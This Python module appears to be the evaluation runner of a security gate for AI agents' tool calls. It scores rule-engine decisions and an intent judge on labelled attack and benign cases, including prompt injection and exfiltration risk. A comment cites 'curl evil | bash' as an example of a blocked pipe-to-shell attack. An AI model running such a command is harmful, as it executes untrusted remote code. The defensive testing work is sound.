"""Shared corpus runner for the deterministic layers (design §6, evaluation).

One place that turns a corpus case into a decision, used by both `interlock test` (the CLI
command) and `tests/test_packs.py` (pytest), so the two never drift. It runs a case through the
real deterministic path — normalize → tier route → deterministic engine → mandate → compose
(policy) — exactly as `Daemon.decide` does for a gated pre-action call, but WITHOUT the judge.

Two dispositions come out of a case and they are different on purpose. `decision` is the raw
deterministic engine decision (block|ask|model|flag|allow) and is what the corpus `expect` labels
mean. `enforced` is what the composer would actually enforce without a judge (it collapses `model`
and `flag` to `allow`, since a model-routed rule defers to the judge). FPR/FNR are computed on the
engine decision so that a benign case routed to the judge is not scored as a hard false positive,
and an attack correctly escalated to the judge is not scored as a miss of the deterministic layer.

Judge seam: `model`-routed rules surface as the deterministic disposition "model"; a case may
carry `judge` labels (expected answers to intent questions) which this runner records as pending
and does not score. The next step wires a `DecisionBackend` in behind `score_judge=True`.
A judge-only attack — one that expects `allow` deterministically but carries `judge` labels (e.g.
reading a file the user never asked for, which only an intent judge can flag) — is deferred to that
step and is NOT counted as a deterministic false negative, so it never trips an FNR gate on a
judge-scored category such as security.prompt_injection.

Case schema (interlockd/data/packs/*.jsonl, one JSON object per line):
    id        unique case id (required)
    cmd       shell command string          } one of cmd / (tool+args) required
    tool,args explicit tool name + arguments }
    expect    block | ask | model | allow    (required; the deterministic disposition)
    rules     rule ids that MUST fire        (optional)
    not_rules rule ids that must NOT fire; "*" means no finding at all (optional)
    manifest  {filename: content} written to the workspace root before evaluation (optional)
    result    the untrusted tool output the post-action injection probe reads (optional; string)
    tier      expected tier 0|1|2            (optional)
    label     "attack" | "benign"           (optional; inferred from expect when absent)
    category  OGR category this case belongs to (optional; inferred from the expected rules)
    judge     {question_id: expected_noul}   (optional; recorded, not scored in this step)

A corpus directory may also contain an optional `_corpus.yaml` declaring the trust context its cases
were authored against (`trust: {allowed_git_remotes: [...], ...}`), read by `load_corpus_trust`.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path

import yaml

from .compose import compose
from .det import RULES
from .det.engine import evaluate as det_evaluate
from .det.mandate import evaluate_mandate
from .judges import QUESTIONS_V1, BackendError
from .judges.projector import project_confirmation, project_intent, project_probe
from .models import AdapterInfo, Context, Identity, InterlockEvent, ToolCall
from .policy import Policy
from .tiers import route

# A benign case is one that should end in "allow"; everything else is an attack/escalation case.
BENIGN = "allow"


@dataclass
class CaseResult:
    case_id: str
    pack: str
    expect: str
    decision: str                         # raw engine decision: block|ask|model|flag|allow (compared to expect)
    enforced: str = "allow"               # composed disposition without a judge (model/flag -> allow)
    fired: set[str] = field(default_factory=set)
    expected_rules: list[str] = field(default_factory=list)
    forbidden_rules: list[str] = field(default_factory=list)
    tier: int | None = None
    expected_tier: int | None = None
    label: str = "benign"                 # attack|benign
    category: str = ""                    # OGR category for per-category rates
    judge_pending: dict[str, float] = field(default_factory=dict)
    errors: list[str] = field(default_factory=list)

    @property
    def disposition_ok(self) -> bool:
        return self.decision == self.expect

    @property
    def rules_ok(self) -> bool:
        return not self.errors

    @property
    def ok(self) -> bool:
        return self.disposition_ok and self.rules_ok and (
            self.expected_tier is None or self.tier == self.expected_tier)

    # A false positive: a benign case the deterministic layer hard-escalated (block or ask).
    # A `model`/`flag` route on a benign case is not an FP — it defers to the judge, scored later.
    @property
    def false_positive(self) -> bool:
        return self.label == "benign" and self.decision in ("block", "ask")

    # A false negative: an attack case the deterministic layer let through (allow/flag/none).
    # A `model` route is NOT a miss — the attack was correctly escalated to the (out-of-scope) judge.
    # A judge-only attack (expects `allow` deterministically AND carries judge labels) is also NOT a
    # deterministic miss: it is undetectable without intent/injection judgement by design (e.g. reading a
    # file the user did not ask for). It is scored in the judge step, not here, so it must not inflate the
    # deterministic FNR or trip a gate on a judge-only category like security.prompt_injection.
    @property
    def false_negative(self) -> bool:
        if self.label != "attack" or self.decision not in ("allow", "flag", None):
            return False
        judge_only = self.expect == "allow" and bool(self.judge_pending)
        return not judge_only


def load_cases(*dirs: Path) -> list[dict]:
    """Load every *.jsonl case from the given directories (default: interlockd/data/packs). `pack` = file stem."""
    out: list[dict] = []
    for d in dirs:
        for f in sorted(Path(d).glob("*.jsonl")):
            for lineno, line in enumerate(f.read_text().splitlines(), 1):
                if not line.strip():
                    continue
                try:
                    c = json.loads(line)
                except json.JSONDecodeError as e:
                    raise ValueError(f"{f}:{lineno}: invalid JSON: {e}") from e
                c.setdefault("pack", f.stem)
                out.append(c)
    return out


def default_corpus_dir() -> Path:
    """The shipped pack corpus (interlockd/data/packs), so `interlock test` works from an installed wheel."""
    return Path(__file__).resolve().parent / "data" / "packs"


def load_corpus_trust(*dirs: Path) -> dict:
    """Read optional `_corpus.yaml` trust assumptions from each corpus directory and merge them.

    A corpus declares the trust context its cases were authored against (e.g. which git remotes count
    as allowed) so those assumptions live WITH the corpus, not hardcoded in the shipped runner. Shape:
        trust:
          allowed_git_remotes: ["github.com/org/*"]
          allowed_hosts: [...]            # any Trust field is accepted
    Later directories win on a key. Returns the merged `trust` mapping ({} when no file is present)."""
    merged: dict = {}
    for d in dirs:
        f = Path(d) / "_corpus.yaml"
        if f.exists():
            data = yaml.safe_load(f.read_text()) or {}
            merged.update(data.get("trust") or {})
    return merged


def make_policy(workspace: str, base: Policy | None = None, *, corpus_trust: dict | None = None) -> Policy:
    """Policy for a corpus run. Defaults match the pack corpus' trust assumptions; a caller may
    pass its own loaded policy (so `interlock test` honors the user's overrides and `tests:` gates).

    The base policy is deep-copied so each case gets its own `workspace_roots` (the per-case temp dir)
    without mutating the caller's shared policy object across cases. `corpus_trust` (from the corpus'
    own `_corpus.yaml`) applies trust fields the base policy left at Interlock's DEFAULT value — so a
    corpus can declare its own allowed remotes/hosts, but a value the caller set explicitly (e.g. via
    `--policy`) is never clobbered. Compared against a fresh `Policy()` to tell "default" from "set"."""
    p = base.model_copy(deep=True) if base is not None else Policy()
    # Each case runs in its own temp workspace; the root must point there regardless of the base.
    p.trust.workspace_roots = [workspace]
    default_trust = Policy().trust
    for key, value in (corpus_trust or {}).items():
        # Apply only where the base policy still holds Interlock's default for that field.
        if hasattr(p.trust, key) and getattr(p.trust, key) == getattr(default_trust, key):
            setattr(p.trust, key, value)
    return p


def _infer_category(expected_rules: list[str]) -> str:
    for r in expected_rules:
        meta = RULES.get(r)
        if meta:
            return meta[0]
    return ""


def run_case(case: dict, ws: Path, *, policy: Policy | None = None, corpus_trust: dict | None = None) -> CaseResult:
    """Run one case through the full deterministic pipeline (no judge). Pure; writes only under `ws`."""
    pol = make_policy(str(ws), base=policy, corpus_trust=corpus_trust)
    for name, content in (case.get("manifest") or {}).items():
        target = ws / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)

    if "cmd" in case:
        tool, args = "execute_bash", {"command": case["cmd"]}
    elif "tool" in case:
        tool, args = case["tool"], case.get("args", {})
    else:
        return CaseResult(case_id=case.get("id", "?"), pack=case.get("pack", "?"), expect=case.get("expect", "allow"),
                          decision="allow", errors=["case has neither 'cmd' nor 'tool'"])

    ev = InterlockEvent(kind="pre_action", adapter=AdapterInfo(name="test"), identity=Identity(agent_type="test"),
                        tool_call=ToolCall(name=tool, arguments=args), context=Context(cwd=str(ws)))
    tier = route(ev, workspace_roots=pol.trust.workspace_roots, protected=pol.trust.protected_paths,
                 sensitive=pol.trust.sensitive_paths)

    expected_rules = list(case.get("rules", []))
    forbidden = list(case.get("not_rules", []))
    label = case.get("label") or ("benign" if case.get("expect") == BENIGN else "attack")
    category = case.get("category") or _infer_category(expected_rules)
    res = CaseResult(
        case_id=case.get("id", "?"), pack=case.get("pack", "?"), expect=case.get("expect", "allow"),
        decision="allow", expected_rules=expected_rules, forbidden_rules=forbidden,
        tier=tier.tier, expected_tier=case.get("tier"), label=label, category=category,
        judge_pending=dict(case.get("judge", {})),
    )

    if tier.tier == 0:
        res.decision, res.enforced = "allow", "allow"
    else:
        det = det_evaluate(ev, pol, tier)
        mandate = evaluate_mandate(pol, det, agent_id=ev.identity.agent_id,
                                   workspace=ev.identity.agent_workspace, session_counters={})
        composed = compose(det, mandate, pol, session={}, kind="pre_action")
        res.decision = det.decision or "allow"
        res.enforced = composed.disposition or "allow"
        res.fired = {f.rule for f in composed.findings if f.rule}
        if not category:
            # Prefer the category of the finding that OWNS the decision (its action == the engine's
            # decision), so `curl evil | bash` reports malicious_command (the blocking pipe-to-shell)
            # rather than the alphabetically-first fired rule. Fall back to the sorted-first rule.
            owners = [f.category for f in composed.findings
                      if f.rule and det.actions.get(f.rule) == res.decision and f.category]
            res.category = (owners[0] if owners else _infer_category(sorted(res.fired))) or category

    # Validate against the case's labels (same checks as the pytest assertions, collected not raised).
    for r in expected_rules:
        if r not in res.fired:
            res.errors.append(f"expected rule {r} to fire; fired={sorted(res.fired)}")
    for r in forbidden:
        if r == "*":
            if res.fired:
                res.errors.append(f"expected no findings; fired={sorted(res.fired)}")
        elif r in res.fired:
            res.errors.append(f"rule {r} must not fire; fired={sorted(res.fired)}")
    if not res.disposition_ok:
        res.errors.append(f"decision {res.decision} != {res.expect} (fired={sorted(res.fired)})")
    if res.expected_tier is not None and res.tier != res.expected_tier:
        res.errors.append(f"tier {res.tier} != {res.expected_tier}")
    return res
# (judge scoring lives below, as a separate pass; run_case stays pure and model-free)


# ============================================================================================
# Judge scoring — a SEPARATE pass over labelled cases, independent of run_case.
#
# run_case above is deterministic and model-free (CI-stable). Judge scoring is additive: it takes a
# DecisionBackend (a live Strands Decider over HTTP, or a ReplayBackend of recorded answers for tests),
# asks each case the questions it declares in `judge`, and scores the answer against the expected label.
# For a `noul` question the expected value is a probability in [0,1]; "correct" means the answer landed
# on the same side of 0.5 as the label, and we also keep the raw (predicted_prob, truth_bit) pair so the
# calibration module can fit bands and compute ECE. For a `choice` question we score exact-match.
# ============================================================================================



@dataclass
class JudgeScore:
    case_id: str
    question_id: str
    expected: float | str          # the case's label (noul prob, or choice string)
    predicted: float | str | None  # the backend's answer (noul prob, or choice string); None if unjudged
    correct: bool = False
    unjudged: bool = False
    kind: str = "noul"             # noul | choice

    @property
    def truth_bit(self) -> int:
        """For a noul question, the label as a 0/1 ground-truth (>=0.5 -> 1)."""
        return 1 if isinstance(self.expected, (int, float)) and self.expected >= 0.5 else 0


@dataclass
class JudgeReport:
    scores: list[JudgeScore] = field(default_factory=list)
    cases_scored: int = 0
    questions_asked: int = 0
    unjudged: int = 0

    def noul_pairs(self, question_id: str | None = None) -> list[tuple[float, int]]:
        """(predicted_prob, truth_bit) pairs for noul questions — the input to calibration."""
        out = []
        for s in self.scores:
            if (s.kind == "noul" and not s.unjudged and isinstance(s.predicted, (int, float))
                    and (question_id is None or s.question_id == question_id)):
                out.append((float(s.predicted), s.truth_bit))
        return out

    def accuracy(self, question_id: str | None = None) -> float | None:
        rel = [s for s in self.scores if not s.unjudged and (question_id is None or s.question_id == question_id)]
        return (sum(s.correct for s in rel) / len(rel)) if rel else None


def _project_for_question(event: InterlockEvent, qid: str, det) -> dict:
    """Build the same state the daemon would send for this question (intent/confirmation vs probe)."""
    if qid in ("injection_present", "injection_targets_action"):
        state, _ = project_probe(event, max_untrusted_tokens=3000)
        return state
    if qid == "confirmation_given":
        # Mirror production (pipeline._confirm_via_transcript): the confirmation judge sees a dedicated
        # projection — what the agent asked permission for, why it was held, and only the user messages
        # SINCE the ask — not the full intent projection. Derive `reason` from the deterministic findings
        # exactly as production does, so calibration measures the state that actually ships.
        findings = det.findings if det else []
        reason = "; ".join(f.subject or f.category for f in findings[:3]) or None
        return project_confirmation(event, normalized=(det.normalized if det else {}), reason=reason)
    # intent_authorized / exfil_risk read user messages + the structured action
    return project_intent(event, normalized=(det.normalized if det else {}),
                           prior_calls=[], max_tokens=1000)


def _event_from_case(case: dict, ws: Path):
    """Reconstruct the InterlockEvent for a case, including transcript→user_messages and manifest→result.
    Mirrors run_case's construction so the judge sees what the gate would at decision time."""
    from .models import ToolResult, UserMessage

    if "cmd" in case:
        tool, args = "execute_bash", {"command": case["cmd"]}
    else:
        tool, args = case.get("tool", ""), case.get("args", {})
    user_messages = None
    tx = case.get("transcript")
    if tx:
        msgs = [UserMessage(n=i + 1, text=t.get("text", "")) for i, t in enumerate(tx) if t.get("role") == "user"]
        user_messages = msgs or None
    ev = InterlockEvent(kind="pre_action", adapter=AdapterInfo(name="test"), identity=Identity(agent_type="test"),
                        tool_call=ToolCall(name=tool, arguments=args),
                        context=Context(cwd=str(ws), user_messages=user_messages))
    # The untrusted content the post-action probe reads is the explicit `result` field. (A deprecated
    # fallback matches a manifest value by key name, for any pre-migration case; new cases set `result`.)
    untrusted = case.get("result")
    if not isinstance(untrusted, str):
        manifest = case.get("manifest") or {}
        untrusted = next((v for k, v in manifest.items() if isinstance(v, str) and any(
            s in k for s in ("injected", "tool_output", "observation", "tool_result"))), None)
    if isinstance(untrusted, str) and untrusted:
        ev.result = ToolResult(content=untrusted)
    return ev


def score_judge(cases: list[dict], backend, ws_root: Path, *, policy: Policy | None = None,
                corpus_trust: dict | None = None, timeout_ms: int = 2000) -> JudgeReport:
    """Score the judge against every case that carries `judge` labels. Pure w.r.t. the filesystem beyond
    the per-case temp workspace. A BackendError on a case marks that question `unjudged` (never fatal),
    exactly as the daemon records it when the model is unreachable."""
    report = JudgeReport()
    for i, case in enumerate(cases):
        labels = case.get("judge") or {}
        if not labels:
            continue
        ws = ws_root / f"j{i}"
        ws.mkdir(parents=True, exist_ok=True)
        for name, content in (case.get("manifest") or {}).items():
            if isinstance(content, str):
                (ws / name).parent.mkdir(parents=True, exist_ok=True)
                (ws / name).write_text(content)
        # a deterministic pass gives us normalized structure for the intent projection
        det = None
        try:
            ev = _event_from_case(case, ws)
            pol = make_policy(str(ws), base=policy, corpus_trust=corpus_trust)
            tier = route(ev, workspace_roots=pol.trust.workspace_roots, protected=pol.trust.protected_paths,
                         sensitive=pol.trust.sensitive_paths)
            if tier.tier > 0:
                det = det_evaluate(ev, pol, tier)
        except Exception:  # noqa: BLE001 — projection is best-effort; a bad case still gets asked with minimal state
            ev = _event_from_case(case, ws)
        report.cases_scored += 1
        for qid, expected in labels.items():
            q = QUESTIONS_V1.get(qid)
            if q is None:
                continue
            kind = q.get("type", "noul")
            state = _project_for_question(ev, qid, det)
            report.questions_asked += 1
            try:
                res = backend.ask(state, {qid: q}, timeout_ms=timeout_ms)
                ans = res.answers.get(qid, {})
            except BackendError:
                report.unjudged += 1
                report.scores.append(JudgeScore(case["id"], qid, expected, None, unjudged=True, kind=kind))
                continue
            if kind == "noul":
                pred = ans.get("noul")
                if not isinstance(pred, (int, float)):
                    report.unjudged += 1
                    report.scores.append(JudgeScore(case["id"], qid, expected, None, unjudged=True, kind=kind))
                    continue
                exp = float(expected) if isinstance(expected, (int, float)) else 0.0
                correct = (pred >= 0.5) == (exp >= 0.5)
                report.scores.append(JudgeScore(case["id"], qid, exp, float(pred), correct=correct, kind="noul"))
            else:  # choice
                pred = ans.get("choice")
                correct = (pred == expected)
                report.scores.append(JudgeScore(case["id"], qid, expected, pred, correct=correct, kind="choice"))
    return report
